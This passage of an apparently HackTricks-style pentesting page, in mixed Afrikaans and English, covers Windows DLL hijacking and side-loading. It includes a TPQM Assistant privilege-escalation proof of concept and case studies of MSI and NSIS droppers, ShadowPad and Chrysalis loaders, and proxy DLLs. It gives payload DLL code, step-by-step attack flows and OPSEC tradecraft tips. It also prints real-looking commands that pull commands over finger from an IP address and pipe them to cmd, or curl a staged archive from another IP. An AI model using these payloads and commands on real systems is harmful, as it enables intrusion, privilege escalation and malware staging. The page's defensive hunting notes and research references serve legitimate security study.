- **DLL Search Behavior**: Probeer om `hostfxr.dll` eers uit sy working directory te laai en log "NAME NOT FOUND" as dit ontbreek, wat local directory search precedence aandui.

### Exploit Implementation

’n Attacker kan ’n kwaadwillige `hostfxr.dll` stub in dieselfde directory plaas, en die ontbrekende DLL uitbuit om code execution onder die user se context te verkry:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. As a standard user, drop `hostfxr.dll` into `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag vir die scheduled task om om 9:30 AM te loop onder die huidige gebruiker se context.
3. If an administrator is logged in when the task executes, the malicious DLL runs in the administrator's session at medium integrity.
4. Chain standaard UAC bypass techniques to elevate from medium integrity to SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors frequently pair MSI-based droppers with DLL side-loading to execute payloads onder 'n trusted, signed process.

Chain overview
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee files in dieselfde folder:
- wsc_proxy.exe: legit signed host (Avast). Die process probeer om wsc.dll by naam uit sy directory te laai.
- wsc.dll: attacker DLL. As geen spesifieke exports vereis word nie, kan DllMain voldoende wees; anders, bou 'n proxy DLL en forward vereiste exports na die genuine library terwyl payload in DllMain loop.
- Bou 'n minimale DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Vir export requirements, use 'n proxying framework (e.g., DLLirant/Spartacus) om 'n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie tegniek maak staat op DLL name resolution deur die host binary. As die host absolute paths of safe loading flags gebruik (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan hijack misluk.
- KnownDLLs, SxS, en forwarded exports kan precedence beïnvloed en moet in ag geneem word tydens die keuse van die host binary en export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point het beskryf hoe Ink Dragon ShadowPad ontplooi met 'n **three-file triad** om in te pas by legitimate software terwyl die core payload encrypted op disk gehou word:

1. **Signed host EXE** – vendors soos AMD, Realtek, of NVIDIA word misbruik (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die attackers hernoem die executable om soos 'n Windows binary te lyk (byvoorbeeld `conhost.exe`), maar die Authenticode signature bly geldig.
2. **Malicious loader DLL** – langs die EXE laat val met 'n verwagte naam (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL is gewoonlik 'n MFC binary wat met die ScatterBrain framework obfuscated is; sy enigste taak is om die encrypted blob te vind, dit te decrypt, en ShadowPad reflectively te map.
3. **Encrypted payload blob** – dikwels gestoor as `<name>.tmp` in dieselfde directory. Nadat die decrypted payload in memory gemap is, delete die loader die TMP file om forensiese bewyse te vernietig.

Tradecraft notes:

* Deur die signed EXE te hernoem (terwyl die oorspronklike `OriginalFileName` in die PE header behou word) kan dit as 'n Windows binary vermom word, maar steeds die vendor signature behou, so reproduceer Ink Dragon se gewoonte om binaries te drop wat soos `conhost.exe` lyk maar eintlik AMD/NVIDIA utilities is.
* Omdat die executable trusted bly, hoef meeste allowlisting controls net jou malicious DLL langsaan te hê. Fokus daarop om die loader DLL aan te pas; die signed parent kan tipies onaangeraak loop.
* ShadowPad se decryptor verwag dat die TMP blob langs die loader leef en writable is sodat dit die file kan zero nadat dit gemap is. Hou die directory writable totdat die payload laai; sodra dit in memory is, kan die TMP file veilig deleted word vir OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger finger → tar/curl → WMI)

Operators pair DLL sideloading met LOLBAS sodat die enigste custom artifact op disk die malicious DLL langs die trusted EXE is:

- **Remote command loader (Finger):** Hidden PowerShell spawn `cmd.exe /c`, trek commands van 'n Finger server, en pipe dit na `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` trek TCP/79 text; `| cmd` execute die server response, wat operators toelaat om second stage server-side te roteer.

- **Built-in download/extract:** Download 'n archive met 'n benign extension, unpack dit, en stage die sideload target plus DLL onder 'n random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` hide progress en volg redirects; `tar -xf` gebruik Windows se built-in tar.

- **WMI/CIM launch:** Start die EXE via WMI sodat telemetry wys 'n CIM-created process terwyl dit die colocated DLL laai:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Werk met binaries wat local DLLs verkies (e.g., `intelbq.exe`, `nearby_share.exe`); payload (e.g., Remcos) run onder die trusted naam.

- **Hunting:** Alert op `forfiles` wanneer `/p`, `/m`, en `/c` saam voorkom; ongewoon buite admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

'n Onlangse Lotus Blossom intrusion het 'n trusted update chain misbruik om 'n NSIS-packed dropper te deliver wat 'n DLL sideload plus fully in-memory payloads stage.

Tradecraft flow
- `update.exe` (NSIS) skep `%AppData%\Bluetooth`, merk dit **HIDDEN**, drop 'n hernoemde Bitdefender Submission Wizard `BluetoothService.exe`, 'n malicious `log.dll`, en 'n encrypted blob `BluetoothService`, en launch dan die EXE.
- Die host EXE import `log.dll` en roep `LogInit`/`LogWrite` aan. `LogInit` mmap-load die blob; `LogWrite` decrypt dit met 'n custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material derived from a prior hash), overwrite die buffer met plaintext shellcode, free temps, en jump daarna.
- Om 'n IAT te vermy, resolve die loader APIs deur export names te hash met **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, en pas dan 'n Murmur-style avalanche (**0x85EBCA6B**) toe en compare teen salted target hashes.

Main shellcode (Chrysalis)
- Decrypt 'n PE-like main module deur add/XOR/sub met key `gQ2JR&9;` oor vyf passes te herhaal, en laai dan dinamies `Kernel32.dll` → `GetProcAddress` om import resolution te voltooi.
- Rekonstrueer DLL name strings by runtime via per-character bit-rotate/XOR transforms, en laai dan `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Gebruik 'n tweede resolver wat die **PEB → InMemoryOrderModuleList** deurloop, parse elke export table in 4-byte blocks met Murmur-style mixing, en val slegs terug op `GetProcAddress` as die hash nie gevind word nie.

Embedded configuration & C2
- Config leef binne die gedropte `BluetoothService` file by **offset 0x30808** (size **0x980**) en word RC4-decrypted met key `qwhvb^435h&*7`, wat die C2 URL en User-Agent openbaar.
- Beacons bou 'n dot-delimited host profile, prepend tag `4Q`, en RC4-encrypt dan met key `vAuig34%^325hGV` voor `HttpSendRequestA` oor HTTPS. Responses word RC4-decrypted en versprei deur 'n tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode is gated by CLI args: no args = install persistence (service/Run key) pointing to `-i`; `-i` relaunch self with `-k`; `-k` skips install and runs payload.

Alternate loader observed
- Dieselfde intrusion het Tiny C Compiler gedrop en `svchost.exe -nostdlib -run conf.c` uitgevoer vanaf `C:\ProgramData\USOShared\`, met `libtcc.dll` langsaan. Die attacker-supplied C source het shellcode ingebed, dit gecompileer, en in-memory uitgevoer sonder om die disk met 'n PE aan te raak. Replicate met:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hierdie TCC-gebaseerde compile-and-run stadium het `Wininet.dll` by runtime ingevoer en ’n tweede-stadium shellcode van ’n hardcoded URL gehaal, wat ’n buigsame loader gegee het wat as ’n compiler run voorgekom het.

## Signed-host sideloading with export proxying + host thread parking

Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.

Observed pattern
- Drop a trusted EXE beside a malicious DLL using the expected dependency name such as `version.dll`.
- The malicious DLL **proxies every expected export** back to the real system DLL (for example `%SystemRoot%\\System32\\version.dll`) so import resolution still succeeds and the host process keeps working.
- After load, the malicious DLL **patches the host entry point** so the main thread falls into an infinite `Sleep` loop instead of exiting or running code paths that would terminate the process.
- A new thread performs the real malicious work: decrypting the next-stage DLL name or path (RC4/XOR are common), then launching it with `LoadLibrary`.

Why this matters
- Normal DLL proxying preserves API compatibility, but it doesn't guarantee the host stays alive long enough for later stages.
- Parking the main thread in `Sleep(INFINITE)` is a simple way to keep the signed process resident while the loader performs decryption, staging, or network bootstrap in a worker thread.
- Hunting only for a suspicious `DllMain` miss this pattern if the interesting behavior happens after the host entry point is patched and a secondary thread starts.

Minimal workflow
1. Copy the signed host EXE and determine the DLL it resolves from the local directory.
2. Build a proxy DLL exporting the same functions and forwarding them to the legitimate DLL.
3. In `DllMain(DLL_PROCESS_ATTACH)`, create a worker thread.
4. From that thread, patch the host entry point or main thread start routine so it loops on `Sleep`.
5. Decrypt the next-stage DLL name/config and call `LoadLibrary` or manual-map the payload.

Defensive pivots
- Signed processes loading `version.dll` or similarly common libraries from their own application directory instead of `System32`.
- Memory patches at the process entry point shortly after image load, especially jumps/calls redirected to `Sleep`/`SleepEx`.
- Threads created by a proxy DLL that immediately call `LoadLibrary` on a second DLL with a decrypted name.
- Full-export proxy DLLs placed next to vendor executables inside writable staging directories such as `ProgramData`, `%TEMP%`, or unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
